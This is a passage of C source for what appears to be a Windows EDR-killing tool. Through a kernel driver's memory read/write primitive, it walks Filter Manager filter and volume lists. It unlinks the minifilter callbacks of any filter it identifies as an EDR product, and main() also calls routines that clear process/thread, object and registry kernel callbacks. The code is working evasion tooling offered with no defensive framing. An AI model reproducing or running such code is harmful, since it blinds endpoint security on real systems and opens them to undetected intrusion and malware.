	printf("FLT_FRAME: 0x%I64x\n", FLT_FRAMEAddr);

	INT64 FLT_FILTERAddr = 0;
	DriverWriteMemery((VOID*)(FLT_FRAMEAddr + 0xB0), &FLT_FILTERAddr, 8);

	INT64 FilterFirstLink = FLT_FILTERAddr;

	ULONG FilterCount = 0;
	DriverWriteMemery((VOID*)(FLT_FRAMEAddr + 0xC0), &FilterCount, 4);

	INT i = 0;
	do {

		FLT_FILTERAddr -= 0x10;

		CHAR* FilterName = ReadDriverName(FLT_FILTERAddr);
		if (FilterName == NULL)break;
		printf("\tFLT_FILTER %s: 0x%I64x\n", FilterName, FLT_FILTERAddr);
		
		if (IsEDR(FilterName)) {
			RemoverInstanceCallback(FLT_FILTERAddr);
		}
		INT64 tmpaddr = 0;
		DriverWriteMemery((VOID*)(FLT_FILTERAddr + 0x10), &tmpaddr, 8);
		FLT_FILTERAddr = tmpaddr;
		i++;
	} while (i < FilterCount);

	INT64 FLT_VOLUMESAddr = 0;
	DriverWriteMemery((VOID*)(FLT_FRAMEAddr + 0x130), &FLT_VOLUMESAddr, 8);

	//printf("FLT_VOLUMESAddr111 ,%I64x\n", FLT_VOLUMESAddr);
	ULONG FLT_VOLUMESCount = 0;
	DriverWriteMemery((VOID*)(FLT_FRAMEAddr + 0x140), &FLT_VOLUMESCount, 4);

	//printf("FLT_VOLUMESCount %d\n", FLT_VOLUMESCount);

	i = 0;
	do {
		FLT_VOLUMESAddr -= 0x10;

		printf("\tFLT_VOLUMES [%d]: %I64x\n", i, FLT_VOLUMESAddr);
		INT64 VolumesCallback = 0;
		if (dwMajor == 10 && dwBuild < 22000) { 
			VolumesCallback = FLT_VOLUMESAddr + 0x120;
		}
		else if (dwMajor == 10 && dwBuild >= 22000) {
			VolumesCallback = FLT_VOLUMESAddr + 0x130;
		}
		else if (dwMajor == 6) {
			VolumesCallback = FLT_VOLUMESAddr + 0x110;
		}
		else {
			printf("Windows system version not supported yet.");
			return;
		}
		
		for (INT j = 0; j < 50; j++) {

			INT64 FlinkAddr = VolumesCallback + (j * 16);
			INT64 Flink = 0;
			INT64 Blink = 0;
			DriverWriteMemery((VOID*)FlinkAddr, &Flink, 8);
			DriverWriteMemery((VOID*)(FlinkAddr + 8), &Blink, 8);

			INT64 First = Flink;
			INT count = 0;
			do {
				count++;
				INT64 NextFlink = 0;
				DriverWriteMemery((VOID*)First, &NextFlink, 8);
				First = NextFlink;
			} while (FlinkAddr != First);
			//printf("count: %d\n", count);

			INT k = 0;
			INT64 CurLocate = Flink;
			do {
				INT64 NextFlink = 0;
				DriverWriteMemery((VOID*)CurLocate, &NextFlink, 8);
				//printf("curlocate1: %I64x\n", CurLocate);
				//system("pause");
				if (IsEDRIntance(j, CurLocate)) {
					INT64 tmpNextFlink = 0;
					DriverWriteMemery((VOID*)CurLocate, &tmpNextFlink, 8);
					DriverWriteMemery(&tmpNextFlink, (VOID*)FlinkAddr, 8);
					DriverWriteMemery(&tmpNextFlink, (VOID*)(FlinkAddr + 8), 8);
				}
				else {
					FlinkAddr = CurLocate;
				}
				CurLocate = NextFlink;
				k++;
			} while (k < count);


		}
		
		INT64 tmpaddr = 0;
		DriverWriteMemery((VOID*)(FLT_VOLUMESAddr + 0x10), &tmpaddr, 8);
		FLT_VOLUMESAddr = tmpaddr;
		i++;

	} while (i < FLT_VOLUMESCount);

}

int main()
{
	HINSTANCE hinst = LoadLibraryA("ntdll.dll");
	if (hinst == NULL) return FALSE;
	NTPROC proc = (NTPROC)GetProcAddress(hinst, "RtlGetNtVersionNumbers");
	proc(&dwMajor, &dwMinorVersion, &dwBuild);
	dwBuild &= 0xffff;
	if (!InitialDriver()) return 0;

	ClearThreeCallBack();
	ClearObRegisterCallbacks();
	ClearCmRegisterCallback();
	ClearMiniFilterCallback();
	
	UnloadDrive();
	system("pause");
}

